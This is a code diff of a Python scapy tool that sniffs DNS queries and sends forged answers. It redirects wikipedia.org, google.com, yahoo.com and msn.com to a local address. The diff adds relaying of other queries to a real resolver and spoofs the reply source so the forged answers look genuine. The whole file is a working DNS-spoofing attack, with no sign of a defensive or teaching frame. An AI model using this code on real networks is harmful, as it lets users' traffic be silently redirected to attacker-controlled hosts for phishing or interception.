@@ -1,20 +1,49 @@
 from scapy.all import *
 from scapy.layers.dns import *
+from config import MY_IP
 
 TEST_MAPPING = {
-  "en.wikipedia.org": "172.67.149.198",
-  "google.com": "172.67.149.198",
-  "translate.google.com": "172.67.149.198",
-  "docs.google.com": "172.67.149.198",
-  "yahoo.com": "172.67.149.198",
-  "msn.com": "172.67.149.198",
+  "en.wikipedia.org": "192.168.2.2",
+  "google.com": "192.168.2.2",
+  "translate.google.com": "192.168.2.2",
+  "docs.google.com": "192.168.2.2",
+  "yahoo.com": "192.168.2.2",
+  "msn.com": "192.168.2.2",
 }
+
+REACHABLE_DNS_SERVER = '8.8.4.4'
+
+def get_real_dns_response(dns_request: Packet, dns_server: str) -> Packet:
+  """
+  Given a DNS request packet, send it to an actual DNS server to query 
+
+  Parameters
+  -----------
+  dns_request: Packet
+    DNS request packet
+  
+  dns_server: str
+    A reachable DNS server
+  """
+  if DNS not in dns_request:
+    return None
+  
+  original_src = dns_request['IP'].src
+  dns_request['IP'].src = MY_IP
+  dns_request['IP'].dst = dns_server
+
+  # Forward the packet to specified DNS server
+  dns_response = sr1(dns_request, timeout=1, verbose=0)
+  if dns_response:
+    dns_response['IP'].dst = original_src
+    dns_response.show()
+  return dns_response
 
 def is_dns_query(packet: Packet):
   """
-  Checks whether the provided packet is a DNS query
+  Checks whether the provided packet is a DNS query for IPV4
   """
-  if DNS in packet and packet.qdcount:
+  if UDP in packet and IP in packet and DNS in packet and packet.qdcount:
     return True
 
   return False
@@ -29,9 +58,15 @@ def intercept_dns(intercept_map: dict):
 
   Parameters
   -----------
-  intercept_map: dict
+  intercept_mapping: dict
     Dictionary mapping of domain name to an IP address to answer with
   """
+  # Add on records for www. prefix
+  intercept_map_modified = {}
+  for key in intercept_map.keys():
+    intercept_map_modified[f'www.{key}'] = intercept_map[key]
+
+  intercept_map |= intercept_map_modified
 
   print('Mapping:')
   for [domain_name, answer_ip] in intercept_map.items():
@@ -39,30 +74,38 @@ def intercept_dns(intercept_map: dict):
   
   def intercept(packet: Packet):
     if is_dns_query(packet):
-      origin_src: str = packet['IP'].src
+      packet.show()
+      original_src: str = packet['IP'].src
+      original_dst: str = packet['IP'].dst
       dns: DNS = packet['DNS']
       requested_domain: bytes = dns.qd.qname
       # Use processed qname field as key for intercept_map
       requested_domain_str: str = requested_domain.decode('utf8')[:-1]
 
-      if(requested_domain_str not in intercept_map):
-        return
-
-      print(f'Answering query for {requested_domain_str} with IP {intercept_map[requested_domain_str]}')
-
-      reply_packet = (
-        IP(dst=origin_src) /
-        UDP(sport=53, dport=packet['UDP'].sport) /
-        DNS(
-          id=dns.id,
-          qr=1,
-          ra=1,
-          qd=dns.qd,
-          an=DNSRR(rrname=requested_domain, rdata=intercept_map[requested_domain_str])
+      # Forward the DNS request to an actual DNS server, then send it back to the requestor
+      if requested_domain_str not in intercept_map:
+        print(f'Domain {requested_domain_str} not in {str(intercept_map)}')
+        dns_response = get_real_dns_response(packet, REACHABLE_DNS_SERVER)
+        if dns_response is not None:
+          print(f'Answering query for {requested_domain_str} with legitimate IP {dns_response["DNSRR"].rdata.decode()}')
+        else:
+          print(f'Unable to contact DNS server {REACHABLE_DNS_SERVER}')
+      else:
+        dns_response = (
+          IP(src=original_dst, dst=original_src) /
+          UDP(sport=53, dport=packet['UDP'].sport) /
+          DNS(
+            id=dns.id,
+            qr=1,
+            ra=1,
+            qd=dns.qd,
+            an=DNSRR(rrname=requested_domain, rdata=intercept_map[requested_domain_str])
+          )
         )
-      )
-      send(reply_packet)
+        print(f'Answering query for {requested_domain_str} with spoofed IP {intercept_map[requested_domain_str]}')
 
+      if dns_response is not None:
+        send(dns_response)
 
   # Sniff for DNS packets and answer accordingly
   sniff(prn=intercept)
